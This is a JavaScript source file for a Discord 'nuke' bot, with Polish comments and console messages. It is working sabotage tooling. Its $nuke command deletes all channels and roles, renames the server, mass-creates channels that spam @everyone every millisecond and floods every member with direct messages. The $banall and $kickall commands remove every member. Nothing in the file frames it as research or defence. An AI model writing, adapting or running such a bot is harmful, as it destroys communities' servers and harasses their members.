/*
* by damageDMG (18.12.2021)
* edit (29.03.2022)
* https://github.com/tojadamage
*/

const { rejects } = require("assert");
const Discord = require("discord.js")
const fs = require("fs");
const { connect } = require("http2");
const { resolve } = require("path");
const readline = require('readline').createInterface({input: process.stdin, output: process.stdout})
FgMagenta = "\x1b[35m"
FgWhite = "\x1b[37m"
FgBlue = "\x1b[34m"
let prefix = "$"
let client = new Discord.Client({
    intents:[
        "GUILDS",
        "GUILD_MESSAGES"
    ]
})
client.config = JSON.parse(fs.readFileSync("config.json", "utf-8"));

client.on('ready', ()=>{
    console.clear();
    console.log(`${FgMagenta}
${FgMagenta}Załadowany bot: ${FgBlue}${client.user.tag}${FgMagenta}
${FgMagenta}Prefix: ${FgBlue}${prefix}${FgMagenta}
${FgMagenta}Token: ${FgBlue}${client.config.token}${FgMagenta}
Komendy: ${FgWhite}
    ${prefix}nuke: robi to co trzeba :d
    ${prefix}banall: banuje wszystkich
    ${prefix}kickall: kickuje wszystkich
    ${prefix}delete: usuwa wszystkie kanaly`)
    console.log(' ')
    client.user.setActivity({name: `💜 KOCHAM TEN DISCORD`, type: "COMPETING"});
    if(client.config.avatarURL !== ""){
        client.user.setAvatar(client.config.avatarURL)
    }
    if(client.config.botName !== ""){
        client.user.setUsername(client.config.botName);
    }
})


client.on('messageCreate', (message) =>{
    
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const guildPerms = message.guild.me.permissions.has("MANAGE_GUILD" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");    

    if(message.content === prefix + "nuke"){
        console.log("Zaczynam Niszczenie!")
        DelAllChannels();
        nuke();
        serverName();
		messageAll();
        delAllRoles();
    } else if(message.content === prefix + "banall"){
        BanAll();
    } else if(message.content === prefix + "kickall"){
        KickAll();
    } else if(message.content === prefix + "delete"){
        DelAllChannels();
    } else if(message.content === prefix + "test"){
        serverAvatar();
    }

    function DelAllChannels(){
        return new Promise((resolve, reject) => {
            if(!channelPerms) return reject("Brak uprawnień do: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => {console.log("Błąd: " + err)}))
            resolve();
        })
    }

    function messageAll(){
        let text = client.config.dmMessage;
        message.guild.members.cache.forEach(member => {
            if(!member.user.bot){
                setInterval(() => {
                    if(!text){
                        member.send("@everyone").catch((err) => console.log(err))
                    } else {
                        member.send("@everyone " + text).catch((err) => console.log(err))
                    }
                }, 1)
            }
        })
    }

    function serverName(){
        if(!guildPerms) return;
        return new Promise((resolve, reject) => {
            message.guild.setName(client.config.newServerName);
            console.log(`Nowa nazwa serwera: ${client.config.newServerName}!`)
        })
    }

    function BanAll(){
        return new Promise((resolve, reject) => {
            if(!banPerms) return reject("Brak uprawnień do: 'BAN_MEMBERS'");
            return new Promise((resolve, reject) => {
                if(!channelPerms) return reject("Brak uprawnień do: 'BAN_MEMBERS'");
                let idArray = message.guild.members.cache.map((user) => user.id);
                message.reply("Banowanie " + idArray.length + " osób!").then((msg) => {
                    setTimeout(() => {
                        msg.edit("ZBANOWANO LAMUSÓW!");
                        for(let i = 0; i < idArray.length; i++){
                            const user = idArray[i];
                            const member = message.guild.members.cache.get(user);   
                            if(member.bannable){
                                member.ban().catch((err) => {console.log("Błąd: " + err)}).then(() => { console.log(`${FgMagenta}[${FgWhite}+${FgMagenta}]${FgMagenta}${member.user.id} ${FgWhite}został zbanowany.`) });
                            } else {
                                console.log("Bot nie ma odpowiednich uprawnień!");
                            }
                        }
                    }, 1000)
                })
                resolve();
            })
        })
    }

    function KickAll(){
        return new Promise((resolve, reject) => {
            if(!kickPerms) return reject("Brak uprawnień do: 'BAN_USER'");
            return new Promise((resolve, reject) => {
                if(!channelPerms) return reject("Brak uprawnień do: 'BAN_MEMBERS'");
                let idArray = message.guild.members.cache.map((user) => user.id);
                message.reply("Kickowanie " + idArray.length + " osób!").then((msg) => {
                    setTimeout(() => {
                        msg.edit("WY**EBANO LAMUSÓW!.");
                        for(let i = 0; i < idArray.length; i++){
                            const user = idArray[i];
                            const member = message.guild.members.cache.get(user);   
                            member.kick().catch((err) => {console.log("Błąd: " + err)}).then(() => { console.log(`${FgMagenta}[${FgWhite}+${FgMagenta}]${FgMagenta}${member.user.id} ${FgWhite}został kickniety.`) });
                        }
                    }, 2000)
                })
            })
        })
    }

    function delAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Brak uprawnień do: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log("Znaleziono błąd: " + err) }))
        })
    }

    function nuke(){
        return new Promise((resolve, reject) => {
            var amount = client.config.channelAmount;
            var channelName = client.config.channelName;
            if(!amount) return reject("Nieokreślone argumenty: Określ ilość!");
            if (isNaN(amount)) return reject("Błąd: Użyj liczby!");
            if (amount > 500) return reject("Błąd: Max to 500, użyj liczby niższej od 500!");
            if (!channelPerms) return reject("Brak uprawnień do: 'MANAGE_CHANNELS'");
            if(!channelName){
                for(let i = 0; i < amount; i++){
                    if (message.guild.channels.cache.size === 500) break;
                    message.guild.channels.create(`${message.author.username} był tutaj`, {type: "GUILD_TEXT"}).catch((err) => console.log("Błąd: " + err)).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone" + client.config.pingMessage);
                        }, 1);
                    });
                }
            } else {
                for(let i = 0; i < amount; i++){
                    if (message.guild.channels.cache.size === 500) break;
                    message.guild.channels.create(`${channelName}`, {type: "GUILD_TEXT"}).catch((err) => console.log("Błąd: " + err)).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone" + client.config.pingMessage);
                        }, 1);
                    });
                }
            }
        })
    }

    function serverAvatar() {
        return new Promise((resolve, rejects) => {
            var avatar = client.user.avatarURL();
            message.guild.setIcon(avatar);
        })
    }

})

client.login(client.config.token);
